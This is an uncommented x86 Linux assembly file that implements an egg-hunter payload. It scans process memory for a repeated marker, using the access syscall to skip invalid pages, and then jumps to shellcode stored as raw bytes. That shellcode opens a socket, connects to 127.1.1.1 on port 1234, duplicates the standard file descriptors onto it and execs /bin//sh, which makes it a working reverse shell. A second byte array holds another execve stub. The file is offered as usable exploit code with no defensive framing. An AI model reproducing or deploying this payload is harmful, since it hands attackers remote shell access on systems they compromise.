  
global _start

section .text

_start:
    mov ebx,0x50905090
    xor ecx,ecx
    mul ecx

nine:
    or dx,0xfff

fourteen:
    inc edx
    pusha
    lea ebx,[edx+0x04]
    mov al,0x21
    int 0x80
    cmp al,0xf2
    popa
    jz nine
    cmp [edx],ebx
    jnz fourteen
    cmp [edx+0x4],ebx
    jnz fourteen
    jmp edx

garbage: db 0x31,0xc0,0x50,0x68,0x2f,0x2f,0x6c,0x73,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x31,0xc9,0x51,0xb1,0x2f,0x51,0x31,0xc9,0x89,0xe1,0x50,0x89,0xe2,0x51,0x53,0x31,0xc9,0x89,0xe1,0xb0,0x0b,0xcd,0x80
egg: db 0x90,0x50,0x90,0x50,0x90,0x50,0x90,0x50
shellcode: db 0x31,0xdb,0xb3,0x02,0x31,0xc9,0xb1,0x01,0x31,0xd2,0x31,0xc0,0x66,0xb8,0x67,0x01,0xcd,0x80,0x31,0xdb,0x89,0xc3,0x68,0x7f,0x01,0x01,0x01,0x66,0x68,0x04,0xd2,0x66,0x6a,0x02,0x31,0xc9,0x89,0xe1,0x31,0xd2,0xb2,0x10,0x31,0xc0,0x66,0xb8,0x6a,0x01,0xcd,0x80,0x31,0xc9,0x31,0xc0,0xb0,0x3f,0xcd,0x80,0xb1,0x01,0x31,0xc0,0xb0,0x3f,0xcd,0x80,0xb1,0x02,0x31,0xc0,0xb0,0x3f,0xcd,0x80,0x31,0xc0,0x31,0xdb,0x53,0x89,0xe2,0x68,0x6e,0x2f,0x73,0x68,0x68,0x2f,0x2f,0x62,0x69,0x89,0xe3,0x31,0xc9,0x51,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80,
    